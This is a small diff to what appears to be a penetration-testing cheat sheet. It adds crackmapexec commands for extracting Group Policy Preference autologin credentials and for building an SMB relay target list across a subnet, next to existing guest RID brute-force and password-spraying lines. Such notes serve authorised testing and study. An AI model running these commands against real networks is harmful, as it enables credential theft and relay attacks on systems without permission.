@@ -595,7 +595,11 @@ crackmapexec smb 10.129.144.138 -u "guest" -p "" --rid-brute --pass-pol
 crackmapexec smb 10.129.144.138 -u user_list -p user_list --no-brute
 
 # GPP
+## gpp-decryp cmd
 crackmapexec smb 192.168.50.75 -u username -p 'Nexus123!' -M gpp_autologin
+
+# Relay target
+crackmapexec smb 172.16.117.0/24 --gen-relay-list relayTargets.txt
 ```
 ### PsMapexec
 ```powershell
